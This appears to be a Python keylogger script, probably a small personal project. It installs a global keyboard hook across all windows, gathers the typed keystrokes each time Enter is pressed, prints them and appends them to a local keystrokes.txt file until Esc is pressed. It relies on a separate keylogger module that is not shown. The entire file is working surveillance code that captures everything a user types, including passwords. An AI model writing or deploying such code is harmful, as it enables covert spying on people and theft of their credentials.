import keyboard
import keylogger


def onKeyEvent(event, keylogger_instance):
    """
    Checks for keyboard event where the enter key is pressed. Upon this event, endAndRestartKeyLogger() is called
    which returns the keys pressed. These keys are then written to the text file where there is an emphasis on where
    the "enter" key was pressed.
    """
    if event.event_type == keyboard.KEY_DOWN and event.name == 'enter':
        keystrokes = endAndRestartKeylogger(keylogger_instance)
        try:
            file = open("keystrokes.txt", "a")
            file.write(keystrokes + "\nPRESSED ENTER HERE\n\n")  # emphasis in text file where "enter" is pressed
        except Exception as ex:  # error handling
            print(f"Error writing to file: {ex}")
        finally:
            file.close()

def endAndRestartKeylogger(keylogger_instance):
    """
    Stops recording, records the keys pressed and stores them as a string. Prints the keys to terminal. Restarts the
    recording. Returns the keys pressed.
    """
    stoppedRecording = keylogger_instance.stopRecording()
    keysPressed = keylogger_instance.getTypedStrings(stoppedRecording)
    keystrokes = keylogger_instance.writeKeysPressed(keysPressed)
    print(keystrokes)
    keylogger_instance.startRecording()
    return keystrokes

def main():

    keylogger_instance = keylogger.Keylogger()

    keylogger_instance.startRecording()

    keyboard.hook(lambda e: onKeyEvent(e, keylogger_instance))  # sets up a global listener for keys across windows

    keyboard.wait("esc")  # key to end the program

    keyboard.unhook_all()  # ensures proper cleanup


main()
